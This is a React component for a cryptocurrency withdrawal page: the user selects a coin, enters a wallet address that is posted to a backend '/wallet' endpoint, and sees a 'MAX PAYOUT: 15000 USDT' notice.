import React, { useState } from "react";
import {
  ChevronDown,
  ChevronLeft,
  Bitcoin,
  Coins,
  CircleDollarSign,
} from "lucide-react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import BASE_URL from "../components/urls";

const cryptoList = [
  { name: "TRX", icon: Coins, network: "Tron (TRC20)" },
  { name: "BTC", icon: Bitcoin, network: "Bitcoin" },
  { name: "ETH", icon: CircleDollarSign, network: "Ethereum" },
  { name: "USDT", icon: CircleDollarSign, network: "Tron (TRC20)" },
];

const Wallet = () => {
  const [selectedCrypto, setSelectedCrypto] = useState(cryptoList[0]);
  const [showDropdown, setShowDropdown] = useState(false);

  const [walletAddress, setWalletAddress] = useState("");
  const [loading, setLoading] = useState(false);

  const navigate = useNavigate();
  const handlePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text");
    setWalletAddress(pasted.trim());
  };

  const canSubmit = walletAddress.trim() && !loading;

  const handleWithdraw = async () => {
    if (!canSubmit) return;

    setLoading(true);

    try {
      await axios.post(`${BASE_URL}/wallet`, {
        walletAddress,
      });

      setWalletAddress(""); // clear after successful submit
      navigate("/transfer");
    } catch (error) {
      console.error("Transfer request failed:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-black min-h-screen text-white p-4 flex flex-col">
      {/* Header */}
      <div className="flex items-center mb-6">
        <ChevronLeft className="text-white w-6 h-6" />
        <h1 className="flex-1 text-center text-lg font-semibold">
          Send {selectedCrypto.name}
        </h1>
      </div>

      {/* Tabs */}
      <div className="flex border-b border-gray-700 mb-4">
        <button className="text-white border-b-2 border-white pb-2 px-3">
          On-chain Transfer
        </button>
      </div>

      {/* Crypto Selector */}
      <div className="relative mb-4">
        <button
          onClick={() => setShowDropdown((s) => !s)}
          className="flex items-center w-full bg-gray-800 rounded-lg px-4 py-3"
        >
          <selectedCrypto.icon className="w-6 h-6 mr-3" />
          <span className="flex-1">{selectedCrypto.name}</span>
          <ChevronDown />
        </button>
        {showDropdown && (
          <div className="absolute top-full left-0 w-full bg-gray-900 rounded-lg shadow-lg mt-2 z-10">
            {cryptoList.map((crypto) => (
              <div
                key={crypto.name}
                className="flex items-center px-4 py-2 hover:bg-gray-700 cursor-pointer"
                onClick={() => {
                  setSelectedCrypto(crypto);
                  setShowDropdown(false);
                }}
              >
                <crypto.icon className="w-6 h-6 mr-3" />
                <span>{crypto.name}</span>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Transfer Network */}
      <div className="bg-gray-800 rounded-lg px-4 py-3 mb-4">
        <p className="text-gray-400 text-sm">Transfer network</p>
        <p className="text-white">{selectedCrypto.network}</p>
      </div>

      {/* Wallet Address */}
      <div className="mb-4">
        <input
          type="text"
          value={walletAddress}
          onChange={(e) => setWalletAddress(e.target.value)}
          onPaste={handlePaste}
          placeholder="Wallet address"
          className="w-full bg-gray-800 rounded-lg px-4 py-3 text-white placeholder-gray-500"
          aria-label="Wallet address"
        />
      </div>

      <p className="text-sm text-gray-400 mb-2">MAX PAYOUT: 15000 USDT</p>

      {/* Withdraw Button */}
      <button
        onClick={handleWithdraw}
        disabled={!canSubmit}
        className={`rounded-lg py-3 w-full text-center font-semibold transition ${
          canSubmit
            ? "bg-blue-600 hover:bg-blue-700 text-white"
            : "bg-gray-700 text-gray-500"
        }`}
      >
        {loading ? "Processing..." : "Withdraw"}
      </button>
    </div>
  );
};

export default Wallet;
